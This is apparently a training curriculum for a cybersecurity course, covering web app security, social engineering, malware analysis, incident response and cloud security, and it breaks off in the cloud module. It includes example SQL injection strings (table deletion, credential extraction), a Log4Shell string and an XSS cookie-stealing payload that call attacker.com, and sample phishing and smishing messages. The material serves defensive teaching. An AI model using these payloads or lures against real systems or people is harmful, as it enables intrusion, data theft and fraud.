# Cybersecurity — Curriculum & Programme Guide (Part 2)
## MetaBridge Academy | Course 4 of 4 | Modules 7–12, Capstone & Certification Exam

**Continued from 01-curriculum.md**
**Reference Textbook:** Cybersecurity Sefer — available at metabridgeacademy.com
**All enrolment:** https://wa.me/2347034357206

---

## MODULE 7: WEB APPLICATION SECURITY
### OWASP Top 10 & Application Penetration Testing

---

### Module Overview
The majority of modern cyberattacks target web applications. Understanding web application vulnerabilities — and how to defend against them — is among the most valuable skills in cybersecurity. This module covers the OWASP Top 10, the industry's definitive list of critical web application security risks.

### Module Objectives
By the end of this module, students will be able to:
1. Explain the OWASP Top 10 (2021 edition) and identify each vulnerability class
2. Demonstrate SQL injection and explain its prevention
3. Explain Cross-Site Scripting (XSS) and implement content security policies
4. Perform web application reconnaissance using Burp Suite
5. Test for authentication vulnerabilities (broken auth, session management)
6. Understand IDOR (Insecure Direct Object Reference) and access control failures
7. Configure security headers to protect web applications

---

### Core Concepts

#### 7.1 OWASP Top 10 (2021)

The Open Web Application Security Project (OWASP) publishes a regularly updated list of the 10 most critical web application security risks.

**A01: Broken Access Control**
The most prevalent vulnerability in 2021 (up from #5 in 2017). Users can act outside their intended permissions.
- Horizontal privilege escalation: User A can access User B's data by changing an ID in the URL
- Vertical privilege escalation: Regular user can access admin functions
- **Nigerian example:** An e-commerce platform where changing the order_id in the URL reveals another customer's order details

**A02: Cryptographic Failures**
Previously called "Sensitive Data Exposure." Weak/missing encryption for data in transit or at rest.
- Transmitting passwords over HTTP
- Storing passwords with MD5 (broken) instead of bcrypt
- Using deprecated TLS 1.0 or TLS 1.1
- Hardcoding API keys in source code (then uploading to GitHub)

**A03: Injection (SQL, Command, LDAP, XML)**
Untrusted data is sent to an interpreter as part of a command or query.

**SQL Injection — the most classic example:**
Vulnerable login code:
```sql
SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'
```
Attacker enters username: `admin'--`
Query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```
The `--` comments out the password check. Attacker logs in as admin.

**More destructive SQL injection:**
```sql
'; DROP TABLE users;--   -- Delete the users table
' UNION SELECT username, password FROM admin_accounts--   -- Extract admin credentials
```

**Prevention:**
- Parameterised queries (prepared statements) — NEVER concatenate user input into SQL
- Input validation and sanitisation
- Principle of least privilege (database user shouldn't have DROP privileges)
- Web Application Firewall (WAF)

**A04: Insecure Design**
Security risks from architectural flaws, not implementation bugs. No control can fully fix insecure design.
- Designing a password reset system that sends OTP via SMS (SIM swappable) vs authenticator app
- Designing APIs that expose unnecessary data

**A05: Security Misconfiguration**
The most common vulnerability — default credentials, open cloud storage, unnecessary features enabled.
- Default admin/admin credentials on a router
- AWS S3 bucket set to public that contains customer data
- Error messages showing stack traces (reveals internal architecture)
- Unnecessary services enabled (FTP server on a web server)

**A06: Vulnerable and Outdated Components**
Using libraries, frameworks, or OS components with known vulnerabilities.
- 2017 Equifax breach: Apache Struts vulnerability known for months before attackers exploited it. 147 million people affected.
- **Log4Shell (CVE-2021-44228) — CVSS 10.0 (Maximum Severity):** The most critical vulnerability of the 2020s. Apache Log4j is a Java logging library used in virtually every enterprise Java application — from iCloud to Amazon, Steam, Microsoft, and millions of enterprise systems worldwide. By inserting a specially crafted string like `${jndi:ldap://attacker.com/exploit}` into any logged field (username, user-agent, search query), an attacker triggers the server to make an outbound LDAP request to the attacker's server and execute arbitrary code. The attacker gains full Remote Code Execution (RCE) with zero authentication. Disclosed December 9, 2021; within 72 hours, over 800,000 exploitation attempts were recorded per hour globally. Remediation: upgrade Log4j to version 2.17.1+. **Teaching point:** This is A06 — the vulnerability was in a widely used open-source library. The organisations affected didn't write the vulnerable code; they included it as a dependency. Dependency management and Software Composition Analysis (SCA) scanning are therefore critical security practices.
- Running outdated WordPress plugins
- **Nigerian risk:** Many Nigerian websites run severely outdated CMS versions; Log4Shell demonstrated that even internal Java services used by Nigerian banks and telcos were vulnerable

**A07: Identification and Authentication Failures**
- Allowing weak passwords ("password123")
- Not implementing multi-factor authentication
- Storing session tokens insecurely
- Session fixation attacks
- Credential stuffing — using breached credential lists to try logins

**A08: Software and Data Integrity Failures**
- Downloading updates without verifying integrity (no signature check)
- Deserialising untrusted data
- CI/CD pipeline attacks (inserting malicious code into the software supply chain)
- **SolarWinds attack:** A trusted software update was compromised — 18,000 organisations installed it

**A09: Security Logging and Monitoring Failures**
Without logs, you can't detect an attack. Without alerting, you can't respond.
- Not logging failed login attempts
- Not monitoring for unusual data access patterns
- Average time to detect a breach: 197 days (IBM Cost of Data Breach Report)

**A10: Server-Side Request Forgery (SSRF)**
An attacker tricks the server into making requests on their behalf — to internal services the attacker can't directly reach.

#### 7.2 Cross-Site Scripting (XSS) in Depth

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

**Types:**
- **Stored XSS:** Malicious script is saved in the database and served to all users who view the page
- **Reflected XSS:** Script is in a URL parameter, reflected back in the page
- **DOM-based XSS:** Script manipulates the DOM in the browser without server interaction

**Classic stored XSS example:**
A forum comment field accepts HTML without sanitisation.
Attacker posts: `<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>`
Every user who views that comment has their session cookie sent to the attacker.
Attacker replays the cookie → hijacks the session → logs in as the victim.

**Prevention:**
- Output encoding — escape `<`, `>`, `"`, `'`, `&` in all user-generated content
- Content Security Policy (CSP) — HTTP header that specifies which scripts are allowed to run
- Input validation
- HTTPOnly cookie flag — prevents JavaScript from accessing cookies

**Content Security Policy example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
```
This only allows scripts from the same origin and one trusted CDN — blocks attacker's script injection.

#### 7.3 Burp Suite — The Web Application Testing Platform

**Burp Suite** is the industry-standard tool for web application penetration testing. Available in Community (free) and Professional editions.

Key components:
- **Proxy:** Intercepts HTTP/HTTPS traffic between browser and application. Inspect, modify, and replay requests.
- **Repeater:** Send the same request multiple times with modifications. Test for injection.
- **Intruder:** Automated attack tool — fuzzing, brute forcing parameters.
- **Scanner (Pro):** Automated vulnerability scanning.
- **Decoder:** Encode/decode Base64, URL encoding, HTML encoding, etc.

**Basic Burp workflow:**
1. Set browser to use Burp as proxy (127.0.0.1:8080)
2. Install Burp's CA certificate in browser (to intercept HTTPS)
3. Browse to the web application
4. Capture requests in Proxy → HTTP History
5. Send interesting requests to Repeater for manual testing
6. Modify parameters to test for vulnerabilities

---

### Module 7 Labs

**Lab 7.1 — SQL Injection (OWASP WebGoat + Burp Suite)**
Platform: OWASP WebGoat (Docker) + Burp Suite Community
Task: Complete the SQL Injection lessons in WebGoat. Demonstrate:
- Authentication bypass via SQL injection
- Extracting data with UNION SELECT
- Blind SQL injection
Document each successful injection with screenshot and explanation.
Duration: 90 minutes

**Lab 7.2 — XSS Discovery (Burp Suite)**
Platform: Burp Suite Community + OWASP DVWA (Damn Vulnerable Web Application)
Task: Configure Burp Suite proxy. Test the stored XSS and reflected XSS labs in DVWA. Demonstrate session cookie theft using stored XSS. Document with screenshots.
Duration: 60 minutes

**Lab 7.3 — Web Application Assessment (OWASP ZAP)**
Platform: OWASP ZAP (free)
Task: Run OWASP ZAP's automated scanner against DVWA. Review the findings. For each finding: verify it's a real vulnerability (not a false positive), document the evidence, and write a remediation recommendation.
Duration: 60 minutes

---

### Module 7 Assignments

1. **OWASP Top 10 Report:** Create a report mapping 5 Nigerian websites (use Nigerian news sites or e-commerce sites) against 3 OWASP Top 10 risks. For each site/risk combination: describe whether the site appears vulnerable and what evidence you saw. (PASSIVE testing only — no active exploitation.)

2. **Secure Code Review:** You are given a PHP code snippet with intentional vulnerabilities. Identify all vulnerabilities, classify each by OWASP category, and rewrite the code securely.

3. **Content Security Policy Design:** Design a Content Security Policy for a Nigerian banking application. The app uses jQuery from a CDN, loads fonts from Google Fonts, uses inline styles for branding, and connects to a payment API. Justify each directive.

4. **IDOR Testing Methodology:** Create a testing checklist for IDOR (Insecure Direct Object Reference) vulnerabilities. Describe each test, how to perform it, what a positive finding looks like, and how to remediate.

5. **Penetration Test Finding:** Write a professional penetration test finding for a critical SQL injection vulnerability discovered on a Nigerian fintech's login page. Include: CVE/CWE reference, CVSS score, description, evidence, impact, and remediation.

---

## MODULE 8: SOCIAL ENGINEERING & PHISHING
### The Human Vulnerability

---

### Module Overview
Technology cannot protect against human error and manipulation. Social engineering exploits psychology — trust, authority, urgency, fear — to bypass technical security controls. This module covers social engineering techniques and defences, with special attention to Nigerian attack patterns.

### Module Objectives
By the end of this module, students will be able to:
1. Identify and classify social engineering techniques
2. Analyse phishing emails using OSINT tools
3. Understand vishing, smishing, and pretexting attack patterns
4. Evaluate Nigerian-specific social engineering threats
5. Design and deliver security awareness training
6. Implement technical controls against phishing

---

### Core Concepts

#### 8.1 Social Engineering Psychology

Social engineering exploits six psychological principles (Robert Cialdini, "Influence"):

1. **Authority:** We obey people who appear to be in authority. "This is your CEO. Wire ₦5M to this account immediately."
2. **Urgency/Scarcity:** Time pressure disables rational thinking. "Your account will be suspended in 24 hours if you don't verify now."
3. **Social Proof:** We follow what others do. "Your colleague already approved this transfer."
4. **Reciprocity:** We feel obligated to return favours. "I just helped you with that issue — can you just give me the password as a formality?"
5. **Liking:** We trust people we like. Attackers build rapport before making requests.
6. **Commitment:** Once we commit to something, we follow through. "You already agreed to help with this — just need one more thing..."

#### 8.2 Attack Techniques

**Phishing:**
Mass email campaign impersonating trusted brands.
Nigerian examples:
- "Your GTBank account has been compromised. Click here immediately." (spoofed from noreply@gt-bank-verify.com)
- "FIRS requires your tax information. Avoid penalty." (spoofed from info@firs-nigeria.gov.com — note the .com, not .gov.ng)
- "Your NIN is unlinked from your SIM. Verify now to avoid service interruption." (NIMC impersonation)

**Indicators of phishing:**
- Sender's domain doesn't match organisation (gtbank.com vs gt-bank-secure.com)
- Generic greeting ("Dear Valued Customer" instead of your name)
- Urgency and fear as motivators
- Spelling and grammatical errors
- Suspicious link (hover to see real destination)
- Request for credentials or payment
- Unexpected attachment

**Spear Phishing:**
Targeted phishing using personalised information from LinkedIn, social media, or previous breaches.
"Dear Chukwuemeka, as discussed in your Monday meeting with Aisha, please find attached the revised budget. Could you review and wire the deposit to our new account?"
(Attacker researched employee names and meeting schedules from social media.)

**Business Email Compromise (BEC):**
Nigeria's most exported cybercrime. The attacker:
1. Compromises or spoofs a CFO or CEO's email account
2. Sends invoice fraud instructions to the finance team
3. Finance team wires money to attacker's account

BEC has caused $43 billion in losses globally (FBI IC3 data). Nigerian groups are responsible for a significant portion.

**Vishing (Voice Phishing):**
Phone-based social engineering. Common Nigerian variants:
- "This is Access Bank fraud department. Your card has been compromised. Please confirm your card number for verification."
- "Your number has won the MTN Monthly Jackpot. To claim your prize, provide your BVN."
- "EFCC is investigating transactions in your name. Cooperate with this verification immediately."

**Smishing (SMS Phishing):**
SMS-based phishing. Extremely effective in Nigeria because SMS open rates are near 98%.
Examples:
- "URGENT: Your Opay account will be restricted. Click [link] to update BVN."
- "UBA: You have received ₦50,000. Confirm receipt: [link]"
- "NIBSS Alert: BVN verification required within 24 hours."

**Pretexting:**
Creating a fabricated scenario to gain trust.
"I'm from your internet service provider doing a routine technical audit. I need you to give me remote access to your computer for about 10 minutes."

#### 8.3 Nigerian-Specific Attack Patterns

**SIM Swap Fraud:**
One of the most common cybercrime types in Nigeria.
1. Attacker gathers victim's personal information (name, address, BVN) from social engineering or data purchases
2. Attacker visits the victim's telecom provider with a fake ID claiming the SIM is lost
3. Telecom transfers the number to a new SIM controlled by the attacker
4. Attacker receives all SMS OTPs — resets victim's banking app, transfers funds

Prevention: Enable SIM lock with your telco. Use authenticator apps (Google Authenticator, Authy) instead of SMS OTP where possible.

**Romance Scam to Cybercrime:**
Attacker builds romantic relationship online over weeks/months. Then:
- Requests financial assistance for fake emergency
- Persuades victim to receive and forward funds (money muling)
- Convinces victim to install software that gives attacker control of their device

**Fake Job Offers:**
"British Petroleum Nigeria is hiring — no experience needed. ₦500,000/month. Send your CV and ₦5,000 processing fee."
- Collects personal data for identity theft
- Extracts "processing fees"
- Victim never gets a job

#### 8.4 Security Awareness Training

The most effective defence against social engineering is an educated workforce.

**Key elements of effective security awareness training:**
1. **Simulated phishing campaigns:** Send fake phishing emails, track who clicks, provide immediate training to those who do
2. **Regular short training:** Monthly 5-minute videos are more effective than annual 2-hour sessions
3. **Clear reporting procedures:** How do employees report suspected phishing? (Easy reporting = more reports)
4. **No blame culture:** Employees who report being phished should be thanked, not punished
5. **Test and measure:** Track click rates over time — improvement shows the programme is working

**Technical controls against phishing:**
- **Email authentication (SPF, DKIM, DMARC):** Prevents email spoofing
- **Email filtering:** Block known malicious domains and file types
- **Link rewriting:** Scan URLs before delivery, block malicious ones
- **Multi-factor authentication:** Even if credentials are stolen, attacker can't log in without the second factor
- **FIDO2/WebAuthn:** Phishing-resistant authentication — the highest standard

---

### Module 8 Labs

**Lab 8.1 — Phishing Email Analysis**
Platform: Email headers analyser (mxtoolbox.com/EmailHeaders), VirusTotal URL scanner
Task: Analyse 5 real-world phishing emails (provided by instructor). For each:
- Extract and analyse email headers (identify spoofed sender, SPF fail, DKIM result)
- Analyse the embedded URLs in VirusTotal without clicking
- Identify psychological manipulation techniques used
- Write a phishing analysis report for each
Duration: 60 minutes

**Lab 8.2 — OSINT for Social Engineering Research**
Platform: LinkedIn, Shodan, Google, crt.sh
Task: Your "client" is NigeriaBank Ltd. (a fictional entity for the exercise). Using only public OSINT, gather information that a social engineer could use:
- Employee names, titles, and LinkedIn profiles
- Technology stack (job listings often reveal this)
- Organisational structure
- Potential pretext scenarios
Produce an OSINT report and a social engineering risk assessment.
Duration: 60 minutes

**Lab 8.3 — SPF/DKIM/DMARC Configuration Analysis**
Platform: MX Toolbox (mxtoolbox.com), DMARC Analyser (dmarcanalyzer.com)
Task: Check the email authentication configuration of 5 Nigerian organisations (NGOs, banks, government agencies):
- SPF record: Does it exist? Is it restrictive?
- DKIM: Is it configured?
- DMARC: What's the policy? (none/quarantine/reject)
Document findings and explain the risk of missing/weak email authentication.
Duration: 45 minutes

---

### Module 8 Assignments

1. **Phishing Email Campaign Design (Defensive Context):** You are the security awareness trainer for a Lagos-based bank. Design a simulated phishing email campaign. Include: the email template, the pretext scenario, the landing page concept, how you'll measure click rates, and what training you'll provide to those who click.

2. **SIM Swap Prevention Policy:** Write a security advisory for a Nigerian organisation's employees about SIM swap fraud. Include: how the attack works, warning signs, prevention steps, and what to do if victimised. Format as a one-page professional memo.

3. **BEC Incident Analysis:** Research a documented Business Email Compromise case that targeted a Nigerian organisation or Nigerian-operated business. Describe: the attack method, the financial loss, how it was discovered, and what technical/procedural controls would have prevented it.

4. **Security Awareness Programme Design:** Design a 6-month security awareness programme for a 500-person Nigerian company. Include: monthly topics, delivery methods, simulated attack schedule, metrics, and budget estimate.

5. **Psychological Manipulation Analysis:** Analyse 3 Nigerian news stories about cybercrime (from Vanguard, This Day, or Premium Times cybercrime coverage). Identify the psychological principles exploited in each attack. What made victims susceptible?

---

## MODULE 9: MALWARE ANALYSIS
### Understanding What Attackers Deploy

---

### Module Overview
Malware is the primary weapon in almost every cyberattack. Security analysts must understand how malware works, how to safely analyse it, and how to defend against it. This module combines static and dynamic analysis techniques.

### Module Objectives
By the end of this module, students will be able to:
1. Classify malware types and explain their behaviours
2. Set up a safe malware analysis environment
3. Perform static analysis (without executing the malware)
4. Perform dynamic analysis using sandbox environments
5. Use ANY.RUN and VirusTotal for professional malware assessment
6. Write professional malware analysis reports

---

### Core Concepts

#### 9.1 Malware Classification

**Ransomware:** Encrypts victim files and demands payment for decryption.
- Modern ransomware uses hybrid encryption: RSA to protect the symmetric key + AES to encrypt files
- Ransomware-as-a-Service (RaaS): Criminal groups rent ransomware infrastructure to affiliates
- **WannaCry (2017):** Exploited EternalBlue (MS17-010). Spread without user interaction. Hit NHS UK, Spanish Telecom, FedEx. Nigeria's NCC issued warnings.
- **LockBit:** Active ransomware group that has targeted African organisations
- **Double extortion:** Encrypt files AND steal data. If you restore from backup, they publish your data.

**Banking Trojans:** Specifically target financial credentials.
- Keylogger component records banking site logins
- Web injection: Modifies what the victim sees on their banking site to add attacker's transfer form
- **Examples:** Dridex, TrickBot, Emotet
- Nigerian financial sector is a primary target

**Remote Access Trojans (RATs):**
Give attackers full remote control: screen capture, keylogging, camera access, file system access, lateral movement capability.
- Disguised as legitimate software: PDF, Word doc, game installer
- **Nigerian context:** Often delivered via WhatsApp as "bank update" or "job application document"

**Spyware:** Silently monitors user activity. Commercial spyware used in stalkerware and corporate espionage.

**Cryptojackers:** Use victim's CPU/GPU to mine cryptocurrency.
- Impact: Slow system performance, high electricity bills, hardware degradation
- Common in Nigerian internet cafes — high electricity cost makes this financially impactful

#### 9.2 Malware Analysis Environment Setup

**CRITICAL SAFETY RULE:** Never analyse malware on your primary machine or production network.

**Analysis environment requirements:**
- **Isolated VM:** VirtualBox or VMware with Host-Only or NAT networking (never bridge to your real network)
- **Snapshots:** Take a snapshot of clean VM before analysis; revert after
- **No real credentials:** The analysis VM should never have real passwords, tokens, or access to real systems
- **Network monitoring:** INetSim or similar to simulate internet services and capture malware's network calls
- **Kali Linux or REMnux** (specialised malware analysis Linux distribution)

#### 9.3 Static Analysis (Without Execution)

Examining the malware file without running it:

**File identification:**
```bash
file malware.exe              # Identify file type (may not be .exe!)
md5sum malware.exe            # MD5 hash — search online for reputation
sha256sum malware.exe         # SHA-256 — VirusTotal uses this
```

**String extraction:**
```bash
strings malware.exe | grep -i "http"    # URLs embedded in binary
strings malware.exe | grep -i "password"   # Credential references
strings malware.exe | grep -E "[0-9]{1,3}\.[0-9]{1,3}"  # IP addresses
```

**PE (Portable Executable) analysis:**
```bash
pecheck malware.exe            # PE header analysis
objdump -d malware.exe         # Disassembly
```

**VirusTotal:**
Upload the file hash (not the file if it's sensitive!) to VirusTotal. 90+ antivirus engines scan it. Check:
- Detection rate (e.g., 67/90 detected)
- Detection names (often reveal family/type)
- Behaviour reports if it's been dynamically analysed
- File relationships (similar files, contacted domains)

#### 9.4 Dynamic Analysis (Controlled Execution)

Execute the malware in a controlled environment and observe behaviour:

**ANY.RUN Interactive Sandbox:**
- Submit a file or URL
- Watch real-time execution in a Windows VM
- See: processes created, network connections made, registry changes, files created/modified/deleted
- Read the MITRE ATT&CK framework mapping for the behaviour
- Download the memory dump, PCAP, process tree

**What to look for in dynamic analysis:**
- **Process injection:** Malware hiding inside a legitimate Windows process (explorer.exe, svchost.exe)
- **Registry persistence:** HKCU\Software\Microsoft\Windows\CurrentVersion\Run — malware adding itself to startup
- **Network C2 (Command & Control):** Outbound connections to attacker's server for instructions
- **DNS queries:** What domains does it contact?
- **File system changes:** What files does it create? Where?
- **Scheduled tasks:** Creating tasks for persistence

**MITRE ATT&CK Framework:**
A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. Organised into Tactics (the WHY) → Techniques (the HOW) → Sub-techniques (the specifics).

Key tactics:
- Initial Access (how attackers get in)
- Persistence (how they stay)
- Privilege Escalation (how they get more access)
- Defence Evasion (how they avoid detection)
- Credential Access (how they steal credentials)
- Lateral Movement (how they spread)
- Exfiltration (how they steal data)
- Impact (ransomware, destruction)

---

### Module 9 Labs

**Lab 9.1 — VirusTotal Analysis**
Platform: VirusTotal (virustotal.com)
Task: Analyse 3 sample file hashes (provided by instructor — known malware samples, no actual files):
- SHA-256 hash lookup
- Review detection rates and names
- Review behaviour reports
- Check file relationships and embedded domains/IPs
Produce a malware threat assessment for each sample.
Duration: 45 minutes

**Lab 9.2 — ANY.RUN Dynamic Analysis**
Platform: ANY.RUN (any.run — free account)
Task: Submit a malicious document (provided safe sample) to ANY.RUN:
- Watch the execution timeline
- Document process tree
- Extract network indicators (domains, IPs, DNS queries)
- Identify MITRE ATT&CK techniques observed
- Download PCAP and review in Wireshark
Write a professional malware dynamic analysis report.
Duration: 90 minutes

**Lab 9.3 — Static Analysis with CyberChef**
Platform: CyberChef (gchq.github.io/CyberChef)
Task: Analyse obfuscated scripts (provided samples):
- Decode Base64-encoded PowerShell
- Identify encoded URLs, IPs, and commands
- Decode XOR-obfuscated strings
- Document the de-obfuscation process step-by-step
Duration: 60 minutes

---

### Module 9 Assignments

1. **WannaCry Post-Mortem Report:** Write a professional malware incident report on WannaCry (2017). Include: malware classification, infection vector, technical behaviour (how it encrypted files, how it spread), indicators of compromise (IOCs), Nigerian context (what Nigerian institutions were affected or warned), and lessons learned.

2. **Ransomware Defence Policy:** A hospital in Abuja is concerned about ransomware after seeing news reports. Create a ransomware defence policy for them. Include: prevention controls, backup strategy, incident response procedures, communication plan, and recovery objectives (RTO/RPO).

3. **IOC Report:** Using VirusTotal and ANY.RUN, investigate a provided malware sample and extract all Indicators of Compromise (IOCs): file hashes, IP addresses, domain names, registry keys, file paths. Format as a structured IOC report suitable for SIEM import.

4. **Malware Family Research:** Research a malware family that has targeted African or Nigerian organisations (Emotet, TrickBot, Lazarus Group tools, or similar). Write a threat intelligence report: malware family overview, TTPs (using MITRE ATT&CK), targeted sectors, geographic focus, and defensive recommendations.

5. **MITRE ATT&CK Mapping:** Map the attack chain of the 2016 Bangladesh Bank SWIFT heist (Lazarus Group) to MITRE ATT&CK techniques. For each technique: ID, name, description of how it was used in the attack, and defensive mitigation.

---

## MODULE 10: INCIDENT RESPONSE & DIGITAL FORENSICS
### When Breaches Happen — What to Do

---

### Module Overview
Every organisation will eventually experience a security incident. Incident response is the structured approach to preparing for, detecting, containing, eradicating, recovering from, and learning from security breaches.

### Module Objectives
By the end of this module, students will be able to:
1. Execute the NIST incident response lifecycle
2. Collect and preserve digital evidence (forensically sound)
3. Analyse logs for indicators of compromise
4. Conduct basic memory and disk forensics
5. Write professional incident reports
6. Understand NDPA 2023 breach notification requirements

---

### Core Concepts

#### 10.1 NIST Incident Response Lifecycle

The NIST SP 800-61 standard defines four phases:

**Phase 1: Preparation**
Before an incident:
- Establish an Incident Response Plan (IRP)
- Create an Incident Response Team (IRT) with defined roles
- Deploy monitoring tools (SIEM, IDS/IPS, EDR)
- Maintain asset inventory — you can't protect what you don't know exists
- Conduct tabletop exercises — simulate incident response
- Establish communication plans (who do you call? in what order?)

**Phase 2: Detection and Analysis**
Identify that an incident has occurred and understand its scope.

Sources of detection:
- SIEM alerts (Security Information and Event Management)
- IDS/IPS alerts
- Employee reports ("I accidentally clicked a link")
- Threat intelligence feeds
- External notification (CBN, law enforcement, customer)

Triage questions:
- What systems are affected?
- What data is at risk?
- Is the attack ongoing?
- What is the business impact?
- Is this a false positive?

**Incident classification:**
- P1 (Critical): Active data breach, ransomware in progress, critical infrastructure down
- P2 (High): Potential breach, significant data exposure, key service degraded
- P3 (Medium): Suspicious activity, policy violation, minor service impact
- P4 (Low): Minimal impact, informational security event

**Phase 3: Containment, Eradication, and Recovery**

**Short-term containment:** Stop the bleeding — isolate affected systems from the network WITHOUT turning them off (memory evidence!).
- Disconnect from network (pull the cable / disable WiFi)
- Block attacker IPs at firewall
- Revoke compromised credentials
- Disable compromised accounts

**Long-term containment:** Maintain operations while the threat is being removed.
- Create forensic images before wiping systems
- Apply temporary workarounds

**Eradication:** Remove the threat completely.
- Remove malware from all affected systems
- Patch the vulnerability that was exploited
- Rebuild compromised systems from clean images
- Reset ALL potentially compromised credentials

**Recovery:** Restore systems to normal operations.
- Restore from clean backups
- Confirm systems are fully functional
- Monitor intensively for re-infection

**Phase 4: Post-Incident Activity**
- **Lessons learned meeting** (within 2 weeks)
- What happened? What went well? What went poorly?
- Update the incident response plan
- Share anonymised findings with industry (threat intelligence)

#### 10.2 Digital Forensics — Preserving Evidence

**The golden rules of digital forensics:**
1. **Preserve the original.** Never work on the original evidence — work on forensic copies.
2. **Chain of custody.** Document every person who handles evidence. Any break in chain can invalidate evidence in court.
3. **Document everything.** Time-stamped notes for every action taken.
4. **Don't alter the evidence.** Write blockers prevent accidental modification when copying drives.
5. **Hash verification.** Hash the original and the copy — if they match, the copy is forensically sound.

**Forensic order of volatility** (collect from most volatile to least):
1. CPU registers and cache (lost immediately when power cut)
2. RAM / memory (lost when system turns off)
3. Network state (connections, ARP cache)
4. Running processes
5. Disk (most persistent — survives power off)
6. Remote logging (sometimes altered by attackers)
7. Physical media (CDs, USB)

**Memory acquisition (Why it matters):**
Malware often runs ONLY in memory — no files on disk. Ransomware keys may be in memory. Session tokens, passwords in memory. Network connections only visible in live system.

Tools: `winpmem` (Windows), `LiME` (Linux kernel module)

**Disk Imaging:**
```bash
# Create forensic image with dd (Linux)
dd if=/dev/sda of=/external/evidence.img bs=4M
# Verify integrity
sha256sum /dev/sda
sha256sum /external/evidence.img
# Mount read-only for analysis
mount -o ro,loop /external/evidence.img /mnt/evidence
```

#### 10.3 Log Analysis for Incident Response

```bash
# Windows Event Log key IDs
4624 - Successful logon
4625 - Failed logon
4648 - Logon with explicit credentials
4698 - Scheduled task created
4720 - User account created
7045 - New service installed

# Linux auth.log patterns
grep "Accepted publickey" /var/log/auth.log   # Key-based SSH logins
grep "sudo:" /var/log/auth.log                 # Privilege escalation via sudo
grep "useradd" /var/log/auth.log               # Account creation
```

**Timeline reconstruction:**
Create a chronological timeline of events using log evidence. Key questions:
- When did the attacker first gain access?
- What systems did they access?
- What data did they touch?
- When did they exfiltrate?
- Are they still in the environment?

#### 10.4 NDPA 2023 Breach Notification Requirements

Under the Nigeria Data Protection Act 2023, when personal data is breached:
- **Within 72 hours:** Notify the Nigeria Data Protection Commission (NDPC)
- **Without undue delay:** Notify affected data subjects if there's high risk to their rights
- **The notification must include:**
  - Description of the breach
  - Categories and approximate number of affected persons
  - Likely consequences of the breach
  - Measures taken to address the breach
  - Contact details of the Data Protection Officer (DPO)

**What counts as a breach:**
- Any unauthorised access, disclosure, alteration, or destruction of personal data
- Loss of a laptop containing unencrypted customer data
- Accidentally emailing customer list to wrong recipient

---

### Module 10 Labs

**Lab 10.1 — Incident Response Tabletop**
Platform: Classroom exercise (written)
Task: Given a scenario: "A Nigerian bank's call centre employee called in sick. An analyst notices that last night, 3 hours of unusual database queries accessed 50,000 customer records from the employee's account. The employee's phone is not reachable." Work through:
- Determine incident classification
- Identify immediate containment steps
- List evidence to collect and in what order
- Draft NDPA 72-hour notification
Duration: 60 minutes

**Lab 10.2 — Windows Log Analysis**
Platform: Windows Event Viewer / provided EVTX log files
Task: Analyse provided Windows Security event logs from a "compromised" system:
- Identify the time and method of initial access
- Find evidence of privilege escalation
- Identify lateral movement
- Build a timeline of attacker activity
Duration: 90 minutes

**Lab 10.3 — ANY.RUN Incident Analysis**
Platform: ANY.RUN public tasks (any.run/tasks)
Task: Find 3 public ANY.RUN analyses of Nigerian banking malware or BEC tools. For each:
- Document the infection chain
- Extract all IOCs (IPs, domains, hashes)
- Map to MITRE ATT&CK
- Write an executive summary of the threat
Duration: 60 minutes

---

### Module 10 Assignments

1. **Incident Response Plan:** Write a complete Incident Response Plan for a 200-person Nigerian fintech company. Include: scope, team roles (RACI), incident classification criteria, response procedures for each classification level, communication templates, and post-incident review process.

2. **NDPA Breach Notification Draft:** You are the CISO of a Nigerian health insurance company. You've just discovered that a database containing 150,000 policyholders' personal and health data was exposed online for 3 weeks due to a misconfigured cloud storage bucket. Draft the complete NDPC breach notification as required by NDPA 2023.

3. **Forensic Analysis Report:** Using the provided memory dump (sample .vmem file and tools), investigate an infected Windows system. Document: evidence of malware presence in memory, network connections at time of capture, attacker tools found, and recommended remediation.

4. **Chain of Custody Form:** Create a professional digital evidence chain of custody form suitable for Nigerian legal proceedings. Research what Nigerian courts require for digital evidence admissibility.

5. **SIEM Use Case Development:** Design 10 SIEM detection rules (in plain English, not code) that would detect common attack patterns seen in Nigerian organisations. For each rule: describe what it detects, the data source, the trigger logic, and the priority level.

---

## MODULE 11: CLOUD SECURITY & EMERGING TECHNOLOGIES
### Securing the Modern Infrastructure

---

### Module Overview
The majority of new Nigerian technology deployments are cloud-first. AWS, Azure, and Google Cloud host Nigerian fintech, e-commerce, and government services. This module covers cloud security principles and the security implications of emerging technologies.

### Module Objectives
By the end of this module, students will be able to:
1. Apply the shared responsibility model for cloud security
2. Identify common cloud misconfigurations and their impact
3. Implement AWS/Azure security best practices
4. Understand IoT security challenges
5. Assess the security of mobile applications (Nigerian context)
6. Evaluate API security best practices

---

### Core Concepts

#### 11.1 Cloud Security Fundamentals

**The Shared Responsibility Model:**
In cloud computing, security responsibility is divided between the cloud provider and the customer.

| Layer | AWS/Azure Responsibility | Customer Responsibility |
|---|---|---|
| Physical infrastructure | ✓ (they secure data centres) | — |
| Hypervisor/virtualisation | ✓ | — |
| Network infrastructure | ✓ | Customer VPC configuration |
| Operating System | For managed services: ✓ | For IaaS (VMs): customer |
| Application | — | Customer |
| Data | — | Customer (encryption, access) |
| Identity & Access | — | Customer (IAM, MFA) |
| Security monitoring | ✓ (platform-level) | Customer (application/data level) |

**Critical misunderstanding:** Many Nigerian companies assume "it's in the cloud = the cloud provider is protecting it." The customer is ALWAYS responsible for their data and application security.

**The most common cloud security mistakes:**

1. **Public S3 buckets (AWS):** Storage buckets accidentally set to public. Exposed customer data, configuration files, database dumps. Has affected multiple African companies.

2. **Overprivileged IAM roles:** Giving applications or users more permissions than they need. Violates principle of least privilege.

3. **Missing MFA on cloud console:** Attackers brute force cloud console credentials. Without MFA, a single password is all they need to access everything.

4. **Default security groups:** AWS security groups default to no restrictions. Leaving databases open to the internet (0.0.0.0/0) on port 3306/5432 is a critical misconfiguration.

5. **Hardcoded credentials in code:** Developers push AWS access keys or API keys to GitHub. Tools like GitLeaks and GitHub's own secret scanning can find these.

6. **No logging:** CloudTrail (AWS) or Azure Monitor not enabled. No visibility into what's happening.

#### 11.2 AWS Security Services

**IAM (Identity and Access Management):**
- Users: Individual accounts
